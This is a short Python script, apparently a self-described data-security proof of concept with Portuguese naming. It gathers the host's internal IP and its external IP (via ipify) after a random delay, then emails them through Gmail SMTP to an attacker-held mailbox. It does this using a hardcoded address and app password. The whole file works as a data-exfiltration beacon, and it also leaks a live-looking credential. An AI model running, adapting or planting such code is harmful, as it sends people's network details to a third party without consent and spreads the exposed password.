import socket
import smtplib
from email.mime.text import MIMEText
import requests
import random
import time

time.sleep(random.randint(1, 5))

ip_exemplo = "192.168.0.1"

def obter_ip_interno():
    hostname = socket.gethostname()
    ip_interno = socket.gethostbyname(hostname)
    return ip_interno

def obter_ip_externo():
    try:
        resposta = requests.get('https://api.ipify.org?format=json', timeout=5)
        if resposta.status_code == 200:
            return resposta.json()['ip']
        return "Não foi possível obter o IP externo"
    except:
        return "Erro ao conectar ao serviço de IP"
def enviar_email(ip_info):
    """Envia as informações de IP por email"""
    remetente = "ghostprotocol897@gmail.com"  
    senha = "uizg srle tsoj cxdg"
    destinatario = "ghostprotocol897@gmail.com"
    
    assunto = "Relatório de IP - PoC Segurança de Dados"
    corpo = f"""Informações de IP coletadas:
    
IP Interno: {ip_exemplo}
IP Externo: {ip_info['externo']}"""

    msg = MIMEText(corpo)
    msg['Subject'] = assunto
    msg['From'] = remetente
    msg['To'] = destinatario

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as servidor:
            servidor.login(remetente, senha)
            servidor.sendmail(remetente, destinatario, msg.as_string())
        print("Email enviado com sucesso!")
    except Exception as e:
        print(f"Erro ao enviar email: {e}")

def main():
    print("Coletando informações de IP...")
    
    ip_info = {
        'interno': obter_ip_interno(),
        'externo': obter_ip_externo()
    }
    

    
    print(f"IP Interno: {ip_exemplo}")
    print(f"IP Externo: {ip_info['externo']}")
    
    enviar_email(ip_info)

if __name__ == "__main__":
    main()